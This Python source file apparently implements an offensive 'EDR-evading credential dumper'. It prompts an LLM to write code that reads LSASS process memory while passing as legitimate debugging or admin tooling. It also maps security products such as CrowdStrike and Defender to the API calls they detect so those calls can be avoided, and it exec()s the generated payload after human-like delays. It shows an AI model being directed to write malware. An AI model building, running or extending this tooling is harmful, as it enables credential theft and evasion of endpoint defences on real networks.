import json
from typing import Dict, List
from ..core.llm_interface import LLMInterface
from ..core.behavioral_randomizer import BehavioralRandomizer
from ..core.polymorphic_generator import PolymorphicPayloadGenerator
import ctypes

class EDREvadingCredentialDumper:
    def __init__(self, api_endpoint: str, api_key: str):
        self.llm = LLMInterface(api_endpoint=api_endpoint, api_key=api_key, model="gpt-4o")
        self.randomizer = BehavioralRandomizer(aggression_level="moderate")
        self.generator = PolymorphicPayloadGenerator(
            llm_interface=self.llm,
            randomizer=self.randomizer
        )
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    def perform_environment_recon(self) -> Dict:
        """
        Reconnaissance phase with behavioral diversity
        Establishes context for payload generation
        """
        
        print("[*] Phase 1: Environment reconnaissance")
        
        recon_targets = [
            "Running processes and their parent relationships",
            "Installed security products",
            "PowerShell logging configuration",
            "User privilege level",
            "Network configuration"
        ]
        
        # Generate reconnaissance variant
        recon_code = self.generator.generate_recon_variant(
            recon_targets=recon_targets,
            environment_context={
                "typical_activity": "Windows domain environment",
                "user_role": "developer"
            }
        )
        
        # Execute with behavioral randomization
        result = self.generator.execute_polymorphic_operation(
            operation_type="reconnaissance",
            parameters={
                "targets": recon_targets,
                "style": "interactive",
                "environment": {"os": "windows", "domain_joined": True}
            }
        )
        
        return result
    
    def generate_adaptive_dumper(self, 
                                environment_info: Dict,
                                avoid_patterns: List[str]) -> str:
        """
        Generate credential dumper adapted to environment
        
        Args:
            environment_info: Reconnaissance results
            avoid_patterns: Detected security controls to evade
            
        Returns:
            Adaptive credential dumping code
        """
        
        print("[*] Phase 2: Generating adaptive credential dumper")
        
        # Build context-aware objective
        objective = """
        Access credentials from memory in a Windows environment.
        
        Requirements:
        1. Identify and access LSASS process memory
        2. Extract credential material
        3. Handle security controls gracefully
        4. Maintain operational security throughout
        5. Use process access patterns that appear legitimate
        """
        
        # Add environment-specific constraints
        constraints = {
            "target_os": environment_info.get("os", "Windows 10"),
            "security_products": environment_info.get("security", []),
            "approach": "Use indirect memory access techniques",
            "error_handling": "Fail gracefully with benign error messages"
        }
        
        # Add patterns to avoid based on reconnaissance
        if avoid_patterns:
            constraints["forbidden_patterns"] = ", ".join(avoid_patterns)
        
        # Style guidance for this specific environment
        style_guidance = f"""
        - Mimic legitimate debugging and diagnostic tools
        - Use Windows debugging APIs rather than direct memory access
        - Implement process access checks before attempting operations
        - Add extensive error handling that appears administrative
        - Use variable names from system administration contexts
        - Include comments that suggest troubleshooting workflow
        
        Environment context:
        {json.dumps(environment_info, indent=2)}
        """
        
        # Generate variant via LLM
        dumper_code = self.llm.generate_payload_variation(
            objective=objective,
            constraints=constraints,
            style_guidance=style_guidance
        )
        
        return dumper_code
    
    def execute_with_full_evasion(self) -> bool:
        """
        Execute complete credential dumping operation with full evasion
        Demonstrates end-to-end workflow
        """
        
        print("=" * 60)
        print("AI-Powered Credential Dumping with Behavioral Evasion")
        print("=" * 60)
        
        try:
            # Phase 1: Reconnaissance with behavioral diversity
            self.randomizer.human_delay(base_seconds=5.0)
            
            environment_info = self.perform_environment_recon()
            
            print(f"[+] Environment reconnaissance complete")
            
            # Phase 2: Analyze security controls
            self.randomizer.human_delay(base_seconds=3.0)
            
            detected_controls = environment_info.get("security_products", [])
            avoid_patterns = self._analyze_security_controls(detected_controls)
            
            if avoid_patterns:
                print(f"[!] Detected controls: {', '.join(detected_controls)}")
                print(f"[*] Adapting to avoid: {', '.join(avoid_patterns)}")
            
            # Phase 3: Generate adaptive dumper
            self.randomizer.human_delay(base_seconds=4.0)
            
            dumper_code = self.generate_adaptive_dumper(
                environment_info=environment_info,
                avoid_patterns=avoid_patterns
            )
            
            # Phase 4: Execute with behavioral randomization
            self.randomizer.human_delay(base_seconds=6.0)
            
            print("[*] Phase 3: Executing credential extraction")
            print("[*] Using AI-generated behavioral variant")
            
            # Wrap and execute
            executable = self.generator.generate_execution_wrapper(
                core_payload=dumper_code,
                execution_style="interactive"
            )
            
            # Execute with full noise injection
            exec_namespace = {}
            self.randomizer.execute_with_noise(
                lambda: exec(executable, exec_namespace)
            )
            
            print("[+] Operation completed successfully")
            return True
            
        except Exception as e:
            print(f"[!] Operation failed: {str(e)}")
            return False
        
    def _analyze_security_controls(self, 
                                  detected_controls: List[str]) -> List[str]:
        """
        Analyze detected security controls and determine patterns to avoid
        """
        
        patterns_to_avoid = []
        
        # Map security products to known detection patterns
        control_patterns = {
            "CrowdStrike": ["CreateRemoteThread", "OpenProcess with VM_WRITE"],
            "SentinelOne": ["NtReadVirtualMemory", "Direct LSASS access"],
            "Microsoft Defender": ["PowerShell downloadstring", "Encoded commands"],
            "Carbon Black": ["CreateToolhelp32Snapshot", "Process32First"]
        }
        
        for control in detected_controls:
            for product, patterns in control_patterns.items():
                if product.lower() in control.lower():
                    patterns_to_avoid.extend(patterns)
        
        return list(set(patterns_to_avoid))